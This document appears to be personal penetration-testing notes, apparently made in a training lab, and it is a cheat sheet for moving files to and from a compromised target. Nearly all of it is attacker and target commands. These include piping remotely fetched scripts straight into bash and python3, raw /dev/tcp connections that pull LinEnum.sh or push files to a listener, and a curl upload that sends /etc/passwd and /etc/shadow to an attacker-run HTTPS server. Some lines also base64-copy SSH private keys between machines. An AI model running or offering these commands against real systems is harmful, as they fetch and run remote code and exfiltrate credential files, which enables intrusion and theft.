- [ ] Upload To Target
PowerShell Base64 Encode & Decode!!!!
```sh
# attacker
cat id_rsa | base64 -w 0;echo
cat id_rsa | base64 -w 0;echo | xclip -selection clipboard
# on the target
echo -n 'base64String' | base64 -d > id_rsa
```
Wget and cURL (Web Clients)!!!!
```sh
# attacker
updog -p 80
# on the target
wget URL
wget URL -O out.sh
curl -o /tmp/out.sh URL
```
FileLess Ops!!!!
```sh
# attacker
updog -p 80
# on the target
curl URL/shel.sh | bash
wget -qO- URL/script.py | python3
```
Bash (/dev/tcp)!!!!
![[Pasted image 20250608094411.png]]
```sh
# attacker
updog -p 80
nc -lp 9000 > myfile.txt
# on the target
exec 3<>/dev/tcp/10.10.10.32/80
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
cat <&3
cat myfile.txt > /dev/tcp/receiver_ip/9000
```
SSH!!!
```sh
# attacker
sudo service start ssh

# on the target
scp plaintext@192.168.49.128:/root/myroot.txt .
```

- [ ] Download From Target
PowerShell Base64 Encode & Decode!!!!
```sh
some as the upload!!!!!
```
Web Server!!!
```sh
# on the target
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
# attacker
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
python3 -m uploadserver 443 --server-certificate ~/server.pem
```
Alternative Web File Transfer Method!!!
```sh
# on the target
ruby -run -ehttpd . -p8000
php -S 0.0.0.0:8000
python3 -m http.server
python2.7 -m SimpleHTTPServer
# attacker
wget URL
```
SSH!!!
```sh
# on the target
nothing
# attacker
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```
